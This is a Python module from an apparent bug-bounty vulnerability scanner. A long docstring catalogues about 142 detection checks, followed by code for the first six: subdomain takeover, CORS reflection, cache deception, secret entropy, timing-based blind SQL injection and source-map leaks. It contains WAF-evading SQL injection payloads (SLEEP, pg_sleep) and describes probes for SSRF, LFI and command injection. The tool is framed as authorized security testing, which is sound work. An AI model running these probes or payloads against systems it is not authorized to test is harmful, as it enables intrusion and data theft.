"""
detective.py - "detective mindset" checks: pure-Python, zero-new-binary
vulnerability detectors that don't need a CLI tool (unlike tools.py,
which shells out to subfinder/nuclei/etc.).

Plain-language explanation: these are small, focused checks SWAS can run
against a host or URL to catch a few specific, well-known, high-payout bug
classes that generic scanners don't reliably find:

Batch 1:
  1. Subdomain takeover (CNAME points to an unclaimed third-party service)
  2. CORS misconfiguration (server blindly trusts any Origin header)
  3. Web cache deception (private data cached under a fake static URL)
  4. Sensitive file entropy (leaked API keys/secrets sitting in plain JS
     or config files that were never meant to be public)

Batch 2:
  5. Blind SQL injection via timing (quiet, WAF-friendly SLEEP() probes -
     no UNION/OR 1=1 noise that trips signature-based firewalls)
  6. Leaked source maps (.js.map files that let you reconstruct original
     source and find hardcoded secrets/internal URLs)
  7. Open redirect (a redirect-looking parameter that sends users to an
     attacker-controlled domain instead of validating it)
  8. CSP weakness analysis - NOT saved as a standalone finding. A weak
     Content-Security-Policy is routinely triaged as Informative by
     programs unless it's demonstrated alongside a real XSS. This check
     exists purely to log which hosts have loose CSP directives so you
     know where to point manual/dalfox XSS testing effort - never to
     report CSP looseness by itself.

Batch 3:
  9. GraphQL introspection mapper (finds exposed GraphQL endpoints and
     pulls their full schema - types, fields, mutations - which often
     reveals internal/admin functionality never meant to be public)
 10. Exposed Firebase database (JS bundles frequently hardcode a
     Firebase project's databaseURL; if that DB allows anonymous reads,
     the entire dataset is public)
 11. Exposed Docker/Kubernetes control API (an unauthenticated Docker
     daemon or kubelet API on its default port hands over full container
     control)
 12. Exposed .git directory (if a deployed app's .git folder is publicly
     served, HEAD/config confirm it - full source reconstruction from
     this is a bigger follow-up task, not automated in this batch)

Batch 4:
 13. Exposed Elasticsearch index (default port 9200 with no auth hands
     over the full index catalog, and from there, the actual documents)
 14. Exposed Prometheus/Spring Actuator metrics (these endpoints
     frequently dump environment variables, connection strings, and
     internal service maps that were never meant to leave the cluster)
 15. Exposed NoSQL database port (MongoDB 27017, CouchDB 5984 answering
     with no authentication at all)
 16. Swagger/OpenAPI doc parser (finds a live API spec, then flags any
     path whose name suggests admin/internal functionality being
     described - and thus discoverable - without auth)

Batch 5:
 17. WAF/honeypot fingerprinting - NOT saved as a finding (like the CSP
     check). Detects Cloudflare/Akamai/Imperva-style block-page
     signatures so other checks in the same run can tell "the WAF
     blocked us" apart from "the target actually responded that way" -
     without this, a WAF block page can get misread as a real result by
     checks further down the pipeline.
 18. Exposed heapdump (parses a leaked JVM/app heapdump for credential
     and token strings using the same entropy/keyword detection as the
     Actuator and file-entropy checks)
 19. CRLF / HTTP response-splitting (injects a carriage-return-newline
     sequence into a redirect-like parameter and checks whether it lands
     in the raw response headers - only reported when it demonstrates
     actual header injection, e.g. a forged Set-Cookie, not just an
     unencoded newline being reflected in a body)
 20. WebSocket hijacking / CSWSH (opens a WebSocket handshake with an
     arbitrary Origin header and checks whether the server accepts the
     connection - a missing Origin check on an authenticated WebSocket
     lets any website ride a victim's session)

Batch 6:
 21. Blind NoSQL injection (tests login/search forms with MongoDB-style
     operator payloads like {"$ne": ""} - no test account needed, since
     a successful bypass IS the account access)
 22. JSON type confusion (mutates a discovered POST JSON body's field
     types - array/boolean/integer-overflow substitutions - looking for
     backend parsers that mishandle the unexpected shape; confirmation
     is HTTP-status/response-shape based, not a login bypass claim)
 23. HTTP Parameter Pollution recon (duplicates a query parameter and
     checks whether the response changes based on which value "wins" -
     NOT saved as a standalone finding, see check_http_param_pollution's
     own docstring for why: pollution alone proves a parsing
     inconsistency exists, not that it bypasses anything, without a
     privileged session to test against)
 24. Apache OptionsBleed (a malformed OPTIONS request can trigger a
     race condition in vulnerable Apache configs that leaks a fragment
     of server memory into the Allow header - a known, specific,
     easily-confirmed CVE-class bug, not a fuzzing guess)

Batch 7:
  25. JWT alg confusion (flags tokens whose header already advertises
      alg: none or an otherwise weak configuration - detection only,
      does not forge/replay a token against a protected endpoint)
  26. Host header injection (Host/X-Forwarded-Host reflected into a
      redirect Location or the response body - reset-link poisoning,
      cache poisoning)
  27. Reflected SSRF (non-blind only - common callback/fetch params
      pointed at cloud metadata/localhost, response body checked for
      metadata content actually coming back)
  28. Exposed framework debug console (Werkzeug/Rails/Symfony/PHP info
      pages left enabled - RCE or full secret disclosure risk)

Batch 8:
  29. Server-side template injection (proof-based - only fires when
      the evaluated arithmetic result appears, not on raw reflection)
  30. Prototype pollution via JSON __proto__ gadget (checks for
      reflected marker, escalates severity if it leaks into a
      separate follow-up request - shared/global state)
  31. Known API key/secret signature leak (fixed-format provider
      signatures - AWS/Stripe/Google/Slack/Twilio/GitHub/Firebase -
      distinct from the generic entropy check in batch 1)
  32. IDOR candidate flagging - NOT saved as a standalone finding.
      Flags URLs with a sequential ID next to an identity-shaped
      segment for manual two-account verification; real IDOR
      confirmation needs a second authenticated session this
      passive scanner doesn't have.

Batch 9:
  33. Reflected XSS (proof bar: raw payload with intact special
      characters must appear unescaped in a text/html response)
  34. Error-based SQL injection (complements the batch-1 timing-based
      check; matches known DB error signatures, diffed against an
      unmodified baseline response to avoid false positives on apps
      that always show a DB-flavored error page)
  35. XXE, error-based detection only - references a nonexistent file
      path so there's nothing to actually exfiltrate; fires only on
      a parser error signature proving external entity resolution
      was attempted
  36. Insecure deserialization signature - NOT saved as a standalone
      finding. Passively matches known serialization magic bytes/
      prefixes (Java/PHP/pickle/.NET) in cookies and params; flags
      candidates for manual gadget-chain testing, doesn't attempt
      exploitation itself

Batch 10:
  37. Path traversal / LFI - baseline-diffed against the exact
      root:x:0:0: signature of /etc/passwd's first line (or
      win.ini's [extensions]/[fonts] for Windows targets)
  38. OS command injection, blind timing-based - same three-request
      baseline/delayed/zero-delay-control discipline as
      check_blind_sqli_timing, with shell payloads instead of SQL
  39. Publicly-listable cloud storage bucket (S3/GCS) - extracts
      bucket names referenced in page content, then makes a direct
      read-only request to the bucket's own listing endpoint; only
      fires on an actual object listing, not just bucket existence
  40. Exposed .env file - distinct from check_git_exposure (batch 3);
      only fires on a recognized secret-shaped KEY=VALUE line, not
      just a 200 response on /.env

Batch 11:
  41. DOM XSS sink flagging - NOT saved as a standalone finding.
      Static match of source+sink keyword presence in a JS bundle,
      doesn't trace actual taint flow between them.
  42. Auth bypass via method/path override headers (X-HTTP-Method-
      Override, X-Original-URL, etc.) - deterministic status-code
      transition (401/403 -> 200 with real content), no coincidental-
      string risk at all.
  43. Sensitive query-string data leaking via Referer - structural
      check (sensitive param name + missing Referrer-Policy + a
      third-party resource present), not a live-traffic confirmation.
  44. GraphQL schema leak via field-suggestion errors - complements
      check_graphql_introspection for APIs that disable introspection
      but leave "did you mean X?" suggestions on.

Batch 12:
  45. JWT weak/common HMAC signing secret - pure local cryptography,
      no extra requests, zero coincidence-based false-positive risk
      (a secret either reproduces the exact signature or it doesn't)
  46. Open redirect via encoding/parsing bypass - complements batch 1's
      check_open_redirect with backslash/double-slash/percent-encoding
      tricks that naive prefix validators miss; commonly Informative
      without chained impact, flagged in the evidence itself
  47. Missing Subresource Integrity on third-party scripts - NOT saved
      as a standalone finding, same "commonly Informative alone"
      reasoning as check_csp_weakness
  48. Exposed admin/management panel - NOT saved as a standalone
      finding, never attempts credentials (most programs exclude
      brute force/credential guessing regardless of discovery method)

Batch 13 (larger batch, 8 checks):
  49. SSRF-driven internal port/service fingerprinting - same
      reflected-SSRF + baseline-diff technique as check_ssrf_reflected,
      targeting internal service ports instead of cloud metadata.
  50. Mass assignment / privilege escalation via extra JSON fields -
      evidence worded as "accepted/echoed", not "confirmed escalated".
  51. Auth bypass via HTTP verb tampering - complements batch 11's
      method-override check with the verb-based variant of the same
      bug class; same deterministic status-code proof bar.
  52. Unauthenticated GraphQL mutation execution - minimal universal
      probe (mutation { __typename }), no auth sent at all.
  53. Negative-number business logic candidate - NOT a standalone
      finding, flags candidates for manual price/quantity/balance
      manipulation testing.
  54. Predictable/weak token pattern - NOT a standalone finding, a
      single short numeric sample doesn't confirm predictability.
  55. Missing clickjacking protection - NOT a standalone finding,
      same reasoning as check_csp_weakness: almost always Informative
      without a demonstrated sensitive action being framed.
  56. Hardcoded secrets / internal infrastructure disclosure - NOT a
      standalone finding, broader/less format-specific complement to
      check_api_key_leak_signature.

Batch 14 (bulkier still, 10 checks):
  57. LFI via PHP wrapper - php://filter source disclosure, proof
      requires successful base64 decode to real PHP source markers.
  58. LDAP injection, error-based - baseline-diffed error signatures.
  59. XPath injection, error-based - same technique, rarer surface.
  60. CORS null-origin + credentials bypass - deterministic header
      check, distinct from the generic CORS check in batch 1.
  61. Web cache poisoning via unkeyed header - two-step proof (poison
      then a completely plain follow-up still shows the marker).
  62. JWT 'kid' header injection candidate - NOT a standalone finding,
      detection only, no forging/replay.
  63. Missing CSRF token on POST forms - NOT a standalone finding,
      SameSite cookies alone can make this a non-issue.
  64. File upload form candidate - NOT a standalone finding, never
      attempts an actual upload (avoids leaving artifacts on target).
  65. CORS wildcard + credentials together - spec-violating even
      where modern browsers won't act on it.
  66. WebSocket loaded over unencrypted ws:// from an HTTPS page.

Batches 15-17 (built together, 4 checks each):
  Batch 15: 67. Excessive data exposure in API JSON (recon-only) /
    68. API version downgrade bypass (deterministic status-code proof)
    / 69. Missing SPF/DMARC (recon-only, commonly out-of-scope) /
    70. GraphQL query via GET (recon-only, CSRF-chaining candidate)
  Batch 16: 71. Boolean-based blind SQLi (three-way baseline/true/false
    comparison) / 72. SVG upload flagging (recon-only) / 73. JSONP
    callback XSS (unique-marker proof) / 74. Backup/temp file
    disclosure (baseline-diffed against real 404 behavior)
  Batch 17: 75. Azure Blob public exposure (same technique as the S3/
    GCS check) / 76. Origin IP WAF/CDN bypass / 77. CORS subdomain-
    suffix bypass (distinct from the null-origin and wildcard-creds
    checks) / 78. Exposed Prometheus metrics

Batches 18-22 (built together, 4 checks each, 20 total):
  18: 79 dependency manifest exposure / 80 missing HSTS (recon) /
      81 Swagger path enumeration (recon) / 82 cookie missing
      SameSite (recon)
  19: 83 session ID in URL (recon) / 84 open redirect via meta-
      refresh / 85 exposed WSDL/SOAP / 86 predictable UUIDv1 (recon)
  20: 87 TRACE method enabled (recon) / 88 exposed docker-compose.yml
      / 89 WordPress wp-config backup (proactive probe, not
      discovery-dependent like the general backup-file check) /
      90 GraphQL error stack trace leak
  21: 91 exposed DevOps tool panel (Jenkins/Jira/Confluence) /
      92 exposed phpMyAdmin (detection only, no creds attempted) /
      93 exposed ELMAH log / 94 exposed Trace.axd
  22: 95 Laravel debug mode / 96 .git/config embedded credentials /
      97 exposed AWS credentials file / 98 exposed kubeconfig

Batches 23-28 (built together, 4 checks each, 24 total):
  23: 99 exposed Nexus/Artifactory / 100 exposed RabbitMQ management /
      101 exposed Grafana / 102 exposed MinIO console
  24: introduces _raw_tcp_probe, the first non-HTTP technique in this
      module (asyncio.open_connection). 103 exposed Redis no-auth /
      104 exposed Memcached no-auth / 105 FTP anonymous login /
      106 exposed CouchDB Fauxton UI
  25: 107 exposed Zookeeper (raw TCP four-letter word) / 108 exposed
      Solr admin / 109 unauthenticated Jenkins script console
      (narrower/higher-confidence than the generic DevOps panel
      check) / 110 CouchDB _all_dbs unauthenticated listing
  26: framework-specific debug-mode disclosure, complementing
      check_debug_console_exposure and check_laravel_debug_mode_exposure.
      111 Spring Boot /env exposure / 112 Django DEBUG=True /
      113 ASP.NET Yellow Screen of Death / 114 Express stack trace leak
  27: CI/CD config exposure. 115 npm-debug.log / 116 .travis.yml /
      117 CircleCI config / 118 GitHub Actions workflow file
  28: infrastructure-as-code exposure. 119 Terraform state file
      (plaintext secrets from provisioning) / 120 Ansible Vault file
      (encrypted, medium not critical) / 121 Helm values.yaml /
      122 serverless.yml

Batches 29-33 (built together, 4 checks each, 20 total):
  29: introduces a real binary-protocol handshake (PostgreSQL v3
      startup packet + AuthenticationOk parsing), the most involved
      non-HTTP check in this module. 123 exposed Docker daemon API /
      124 Postgres trust auth (raw TCP) / 125 exposed InfluxDB /
      126 exposed Kibana
  30: proactive (not discovery-dependent) file probes. 127 backup
      archive (real magic-byte check) / 128 SQL dump file / 129
      server log file / 130 .htpasswd
  31: 131 OAuth missing state param (recon) / 132 Basic Auth over
      plaintext HTTP / 133 weak TLS protocol (TLSv1.0, raw ssl
      handshake) / 134 cookie missing Secure over HTTPS (recon)
  32: 135 Firebase Realtime DB open read rules / 136-138 cloud
      metadata SSRF for GCP/Azure/DigitalOcean specifically - these
      evade the generic AWS-shaped check_ssrf_reflected because GCP/
      Azure require a specific header the generic probe doesn't send,
      and DigitalOcean uses a distinct path a signature-based WAF
      rule targeting the AWS path wouldn't catch
  33: three more deterministic bypass-header checks (4th technique
      alongside method-override/verb-tampering/host-header) plus two
      recon checks. 139 XFF IP-restriction bypass / 140 Referer-based
      access control bypass / 141 API key in URL query param (recon)
      / 142 password-reset user-enumeration candidate (recon)

Every function here is read-only / non-destructive - no writes, no
exploitation, just detection. Each returns None when nothing is found, or
a dict describing the finding when something is. Callers (pipeline.py)
decide what to do with that.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import math
import os
import random
import re
import ssl
import struct
import time
import uuid
from collections import Counter
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from . import secret_verifier

logger = logging.getLogger("swas.detective")

_TIMEOUT = httpx.Timeout(10.0, connect=5.0)

# Every httpx.AsyncClient below is created with verify=False. This matches
# the rest of this stack (nuclei, httpx-pd, sqlmap - all Go/CLI tools that
# skip strict TLS verification by default) rather than trusting Python's
# stricter default. We are the client intentionally probing someone else's
# infrastructure as an authorized tester, not a browser that needs to trust
# the site - refusing to even connect because a staging/internal host has a
# mismatched or self-signed cert would blind us to exactly the messy,
# interesting hosts (aem-prod, dev-unstable, auth-nonprod, etc.) that are
# often the most worth testing. This was confirmed as a real bug in live
# testing: every CORS/cache-deception check was silently failing with
# CERTIFICATE_VERIFY_FAILED against wildcard-scoped targets before this.


# ---------------------------------------------------------------------
# 1. Subdomain takeover (CNAME fingerprinting)
# ---------------------------------------------------------------------
# Signature list: if a CNAME points at one of these services AND the
# service responds with its own "not claimed / no such site" page, the
# subdomain is very likely hijackable. This is the same public technique
# tools like subjack/nuclei use - it's standard bug bounty recon, not a
# secret list. Kept short and high-confidence on purpose: a shorter list
# of well-known, reliably-fingerprinted services beats a huge list that
# generates noisy false positives.
_MAX_REASONABLE_URL_LENGTH = 500


def _extract_hostname(candidate: str) -> str | None:
    """
    Normalizes a takeover-check candidate into a bare hostname, or
    returns None if it's not something a CNAME lookup makes sense for.
    Scope-import data is often messy - HackerOne/Bugcrowd scope lists
    routinely include app-store links, raw numeric app IDs, or
    malformed concatenated URLs scraped by gau/waybackurls. This exists
    so those get skipped quietly instead of wasting a DNS lookup (and
    cluttering logs) on something that was never a hostname to begin
    with.
    """
    candidate = candidate.strip()
    if not candidate or len(candidate) > _MAX_REASONABLE_URL_LENGTH:
        return None
    if candidate.count("://") > 1:
        return None  # classic sign of a scraper gluing multiple URLs together

    host = urlparse(candidate).netloc if "://" in candidate else candidate.split("/")[0]
    host = host.split(":")[0].split("@")[-1]  # strip port and any userinfo@ prefix

    if not host or "." not in host:
        return None
    if not re.fullmatch(r"[A-Za-z0-9.\-]+", host):
        return None
    return host.lower()


def _looks_like_sane_url(url: str) -> bool:
    """
    Basic sanity gate for the URL-based checks (SQLi timing, open
    redirect, source maps). Rejects the same categories of scraper junk
    as _extract_hostname, plus an overall length cap - a single blind
    SQLi timing test costs several deliberate seconds, so it's worth a
    cheap check up front rather than burning that time on garbage input.
    """
    url = url.strip()
    if not url or len(url) > _MAX_REASONABLE_URL_LENGTH:
        return False
    if url.count("://") > 1:
        return False
    parsed = urlparse(url)
    if not parsed.netloc or "." not in parsed.netloc:
        return False
    return True


_TAKEOVER_FINGERPRINTS: list[tuple[str, str, str]] = [
    # (cname substring, response substring that proves it's unclaimed, service name)
    ("s3.amazonaws.com", "NoSuchBucket", "AWS S3"),
    ("github.io", "There isn't a GitHub Pages site here", "GitHub Pages"),
    ("herokuapp.com", "no-such-app", "Heroku"),
    ("herokudns.com", "no-such-app", "Heroku"),
    ("azurewebsites.net", "404 Web Site not found", "Azure App Service"),
    ("cloudapp.net", "404", "Azure Cloud Service"),
    ("shopify.com", "Sorry, this shop is currently unavailable", "Shopify"),
    ("myshopify.com", "Sorry, this shop is currently unavailable", "Shopify"),
    ("zendesk.com", "Help Center Closed", "Zendesk"),
    ("wpengine.com", "The site you were looking for couldn't be found", "WP Engine"),
    ("fastly.net", "Fastly error: unknown domain", "Fastly"),
    ("ghost.io", "The thing you were looking for is no longer here", "Ghost.io"),
    ("surge.sh", "project not found", "Surge.sh"),
    ("bitbucket.io", "Repository not found", "Bitbucket Pages"),
    ("statuspage.io", "You are being", "Statuspage.io"),
    ("tumblr.com", "Whatever you were looking for doesn't currently exist", "Tumblr"),
    ("pantheonsite.io", "The gods are wise", "Pantheon"),
    ("readme.io", "Project doesnt exist", "Readme.io"),
]


async def check_subdomain_takeover(hostname: str) -> dict | None:
    """
    Resolves the CNAME chain for `hostname` via DNS-over-HTTPS (Cloudflare
    1.1.1.1) - no new binary or DNS library needed since httpx is already
    a dependency. If the CNAME points at a known third-party service, we
    fetch the live page and check for that service's "unclaimed" message.

    Returns a dict describing the finding, or None if nothing looks
    hijackable (which is the overwhelmingly common case - this should
    stay quiet unless it's confident).
    """
    hostname = _extract_hostname(hostname)
    if hostname is None:
        return None  # not a real hostname - scope-import junk, skip quietly

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            logger.info("detective: checking subdomain takeover for %s", hostname)
            dns_resp = await client.get(
                "https://cloudflare-dns.com/dns-query",
                params={"name": hostname, "type": "CNAME"},
                headers={"accept": "application/dns-json"},
            )
            if dns_resp.status_code != 200:
                return None
            answers = dns_resp.json().get("Answer", [])
            cname_targets = [a["data"].rstrip(".") for a in answers if a.get("type") == 5]

            if not cname_targets:
                return None

            for cname in cname_targets:
                for fingerprint, unclaimed_marker, service in _TAKEOVER_FINGERPRINTS:
                    if fingerprint not in cname:
                        continue
                    try:
                        page_resp = await client.get(
                            f"https://{hostname}", follow_redirects=True
                        )
                        body = page_resp.text
                    except httpx.HTTPError:
                        body = ""
                    if unclaimed_marker.lower() in body.lower():
                        return {
                            "vuln_type": "subdomain_takeover",
                            "severity": "high",
                            "evidence": (
                                f"{hostname} CNAMEs to {cname} ({service}), which returns "
                                f"an unclaimed-resource page. Likely takeover candidate."
                            ),
                        }
    except (httpx.HTTPError, ValueError) as exc:
        logger.info("detective: takeover check failed for %s: %s", hostname, exc)
    return None


# ---------------------------------------------------------------------
# 2. CORS misconfiguration
# ---------------------------------------------------------------------

async def check_cors_misconfig(url: str) -> dict | None:
    """
    Sends a request with a clearly-fake Origin header. If the server
    reflects that exact origin back AND allows credentials, any random
    website can read this endpoint's authenticated response in a
    victim's browser - a real, reportable High-severity finding.

    We deliberately only flag the reflect+credentials combination (not
    a wildcard "*" without credentials, which browsers already refuse to
    pair with credentialed requests and is routinely triaged as
    Informative). This keeps the check aligned with what programs
    actually pay for.
    """
    fake_origin = "https://evil-cors-probe.example.com"
    logger.info("detective: checking CORS misconfig for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(url, headers={"Origin": fake_origin})
    except httpx.HTTPError as exc:
        logger.info("detective: CORS check failed for %s: %s", url, exc)
        return None

    allow_origin = resp.headers.get("access-control-allow-origin", "")
    allow_creds = resp.headers.get("access-control-allow-credentials", "").lower()

    if allow_origin == fake_origin and allow_creds == "true":
        return {
            "vuln_type": "cors_misconfiguration",
            "severity": "high",
            "evidence": (
                f"{url} reflected arbitrary Origin '{fake_origin}' in "
                f"Access-Control-Allow-Origin AND set Access-Control-Allow-Credentials: "
                f"true. Any site can read this endpoint's response in a victim's browser."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 3. Web cache deception
# ---------------------------------------------------------------------

# Only worth testing paths that look like they'd return authenticated /
# personal data - hitting this against every static asset wastes cycles
# and produces meaningless results.
_CACHE_DECEPTION_PATH_HINTS = re.compile(
    r"(account|profile|dashboard|settings|billing|invoice|user|me|orders?)\b",
    re.IGNORECASE,
)


async def check_cache_deception(url: str) -> dict | None:
    """
    Appends a fake static extension (e.g. /account/profile/nonexistent.css)
    to a URL that looks like it serves personal data. If a CDN/cache layer
    caches that response as if it were a static asset, a SECOND
    unauthenticated request to the same URL returning the same private
    body (a cache HIT) confirms Web Cache Deception - other users could
    then be served a victim's cached private page.

    Only runs against URLs matching _CACHE_DECEPTION_PATH_HINTS - this is
    intentionally conservative to avoid false positives on generic pages.
    """
    if not _CACHE_DECEPTION_PATH_HINTS.search(url):
        return None

    probe_url = url.rstrip("/") + "/nonexistent-swas-probe.css"
    logger.info("detective: checking cache deception for %s", probe_url)

    try:
        # follow_redirects=False on purpose: a 3xx here means the fake
        # static-extension path isn't actually being served/cached as
        # its own resource - it's just bouncing to the homepage or a
        # catch-all, which is normal CDN caching, not deception.
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            first = await client.get(probe_url)
            if first.status_code != 200:
                return None
            # A cache-deception candidate: the fake-static-extension path
            # returned 200 with a body, AND either an explicit cache HIT
            # header shows up, or the response looks like real page
            # content (html) rather than a generic 404/error page.
            cache_status = (
                first.headers.get("x-cache", "")
                or first.headers.get("cf-cache-status", "")
                or first.headers.get("x-cache-status", "")
            ).lower()

            second = await client.get(probe_url)
            cache_status_2 = (
                second.headers.get("x-cache", "")
                or second.headers.get("cf-cache-status", "")
                or second.headers.get("x-cache-status", "")
            ).lower()

            looks_cached = "hit" in cache_status_2 and first.text == second.text
            looks_like_real_page = "<html" in first.text.lower() and len(first.text) > 200

            if looks_cached and looks_like_real_page:
                return {
                    "vuln_type": "cache_deception",
                    "severity": "high",
                    "evidence": (
                        f"{probe_url} returned HTTP 200 with page content and was served "
                        f"from cache on a second request (cache status: {cache_status_2}). "
                        f"Possible Web Cache Deception - private content may be cached and "
                        f"served to other users."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: cache deception check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 4. Sensitive file entropy checker
# ---------------------------------------------------------------------
# Only worth downloading/scanning files that could plausibly contain
# secrets - random images/fonts/CSS waste bandwidth and produce nothing.
_SENSITIVE_FILE_HINTS = re.compile(
    r"\.(js|json|env|ya?ml|config|cfg|ini|xml|txt)$|\b(config|backup|\.env|settings)\b",
    re.IGNORECASE,
)

# Matches a "key: value" or "KEY=value" looking token so we only run
# entropy math on plausible secret-shaped substrings, not entire minified
# JS blobs (which are naturally high-entropy and would be pure noise).
_TOKEN_PATTERN = re.compile(
    r"""["']?([A-Za-z0-9_]{3,40}(?:key|secret|token|password|pwd|api|auth)[A-Za-z0-9_]{0,10})["']?\s*[:=]\s*["']([A-Za-z0-9_\-/+=.]{12,100})["']""",
    re.IGNORECASE,
)


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


async def check_file_entropy(url: str) -> dict | None:
    """
    Downloads a single file (JS bundle, config, .env-looking path, etc.)
    and looks for key=value / "key": "value" pairs whose value has high
    Shannon entropy - the statistical signature of a real API key, JWT
    secret, or token, as opposed to ordinary readable text. Flags the
    key NAME and entropy score, but truncates the actual secret VALUE in
    the evidence so the finding itself doesn't become a leak.
    """
    if not _SENSITIVE_FILE_HINTS.search(url):
        return None

    logger.info("detective: checking file entropy for %s", url)
    try:
        # follow_redirects=False on purpose: if this URL 3xx's somewhere
        # else, we'd otherwise be scanning an unrelated landing page for
        # entropy and misattributing any hit to this path (the same bug
        # class that caused false heapdump findings).
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: entropy check fetch failed for %s: %s", url, exc)
        return None

    if resp.status_code != 200 or not resp.text:
        return None

    body = resp.text
    hits = []
    for match in _TOKEN_PATTERN.finditer(body):
        key_name, value = match.group(1), match.group(2)
        entropy = _shannon_entropy(value)
        # Entropy > 4.0 over a >=12-char value reliably separates
        # random-looking secrets from ordinary words/placeholders like
        # "your_api_key_here" (English text sits well under 4.0).
        if entropy > 4.0:
            hits.append((key_name, entropy, value[:4] + "..." + value[-2:]))

    if not hits:
        return None

    summary = "; ".join(f"{k} (entropy={e:.2f}, value={masked})" for k, e, masked in hits[:5])
    return {
        "vuln_type": "sensitive_file_exposure",
        "severity": "medium",
        "evidence": (
            f"{url} contains {len(hits)} high-entropy key/value pair(s) that look like "
            f"leaked secrets: {summary}"
        ),
    }


# ---------------------------------------------------------------------
# 5. Blind SQL injection via timing (WAF-quiet)
# ---------------------------------------------------------------------
# WAFs pattern-match on loud payloads (UNION SELECT, OR 1=1). A timing
# payload just asks the database to pause - nothing that looks like an
# attack signature. We confirm with a 3-step measurement (baseline ->
# delayed -> zero-delay control) specifically to rule out ordinary
# network jitter before ever calling this a finding: a single slow
# response proves nothing, three consistent measurements do.
_SQLI_DELAY_SECONDS = 6
_SQLI_TIMING_PAYLOADS = [
    "' OR (SELECT 1 FROM (SELECT(SLEEP({delay})))x) OR '",  # MySQL, generic polyglot
    "'||pg_sleep({delay})--",                                  # PostgreSQL
]
_SQLI_CONTROL_PAYLOAD = "' OR (SELECT 1 FROM (SELECT(SLEEP(0)))x) OR '"

# Only worth testing params on URLs that actually have a query string -
# no query string means nothing to inject into.
_MAX_PARAMS_PER_URL = 2


async def check_blind_sqli_timing(url: str) -> dict | None:
    """
    Tests each query parameter on `url` with a quiet SLEEP()-based timing
    payload. If the response takes noticeably longer than baseline AND a
    zero-delay control request on the SAME parameter returns to normal
    speed, that's strong evidence of a real, exploitable SQL injection -
    ordinary network slowness would affect the control request too.

    Capped to the first 2 query parameters per URL to keep this fast;
    each full test costs ~3 requests (baseline, delayed, control), one
    of which deliberately takes _SQLI_DELAY_SECONDS to complete.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    logger.info("detective: checking blind SQLi timing for %s", url)
    param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]

    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), verify=False) as client:
            t0_start = time.monotonic()
            await client.get(url)
            baseline = time.monotonic() - t0_start

            for param in param_names:
                for payload_template in _SQLI_TIMING_PAYLOADS:
                    payload = payload_template.format(delay=_SQLI_DELAY_SECONDS)
                    mutated = _replace_query_param(parsed, query_params, param, payload)

                    t1_start = time.monotonic()
                    try:
                        await client.get(mutated)
                    except httpx.TimeoutException:
                        pass  # a timeout on the delayed request is itself a data point
                    elapsed_delayed = time.monotonic() - t1_start

                    if elapsed_delayed < baseline + (_SQLI_DELAY_SECONDS - 1.0):
                        continue  # not slow enough to be the injected delay - try next payload

                    # Confirm with a same-parameter, zero-delay control -
                    # if this also comes back slow, it's network jitter,
                    # not the database honoring our SLEEP().
                    control_url = _replace_query_param(
                        parsed, query_params, param, _SQLI_CONTROL_PAYLOAD
                    )
                    t2_start = time.monotonic()
                    await client.get(control_url)
                    elapsed_control = time.monotonic() - t2_start

                    if elapsed_control < baseline + 2.0:
                        return {
                            "vuln_type": "blind_sql_injection",
                            "severity": "critical",
                            "evidence": (
                                f"{url} param '{param}': baseline={baseline:.1f}s, "
                                f"SLEEP({_SQLI_DELAY_SECONDS}) payload={elapsed_delayed:.1f}s, "
                                f"zero-delay control={elapsed_control:.1f}s. Timing consistently "
                                f"follows the injected delay - confirmed blind SQL injection."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: blind SQLi timing check failed for %s: %s", url, exc)
    return None


def _replace_query_param(parsed, query_params: dict, target_param: str, value: str) -> str:
    """Rebuilds `url` with `target_param`'s value swapped for `value`,
    leaving every other query parameter untouched."""
    new_params = {k: v[0] for k, v in query_params.items()}
    new_params[target_param] = value
    new_query = urlencode(new_params)
    return urlunparse(parsed._replace(query=new_query))


# ---------------------------------------------------------------------
# 6. Leaked source maps
# ---------------------------------------------------------------------
# Same secret-shaped-token pattern used by check_file_entropy - a source
# map's "sourcesContent" is effectively the developer's original,
# unminified code, so it's worth running the same entropy check against
# it as we would any other config/JS file.
_SECRET_KEYWORD_PATTERN = re.compile(
    r"(AWS_SECRET|DB_PASSWORD|JWT_SECRET|API_KEY|PRIVATE_KEY|ACCESS_TOKEN)",
    re.IGNORECASE,
)


async def check_source_map_leak(js_url: str) -> dict | None:
    """
    If `js_url` is a JS bundle, checks whether the matching `.js.map`
    source map is also publicly exposed. If it is, and the reconstructed
    source contains secret-shaped tokens or known secret keyword names,
    flags it - this is the case that actually matters. A source map with
    no secrets in it just tells you the code structure, which is a
    real but much lower-value finding, so we deliberately don't report
    that case at all here (avoids padding your report queue with weak
    Informative-risk findings).
    """
    if not js_url.lower().split("?")[0].endswith(".js"):
        return None

    map_url = js_url + ".map"
    logger.info("detective: checking source map leak for %s", map_url)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(map_url)
    except httpx.HTTPError as exc:
        logger.info("detective: source map check failed for %s: %s", map_url, exc)
        return None

    if resp.status_code != 200:
        return None

    try:
        data = resp.json()
    except ValueError:
        return None

    if "sources" not in data:
        return None  # not actually a source map, just a 200 on that path

    sources_content = data.get("sourcesContent") or []
    combined = "\n".join(s for s in sources_content if isinstance(s, str))
    if not combined:
        return None

    keyword_hits = set(_SECRET_KEYWORD_PATTERN.findall(combined))
    entropy_hits = []
    for match in _TOKEN_PATTERN.finditer(combined):
        key_name, value = match.group(1), match.group(2)
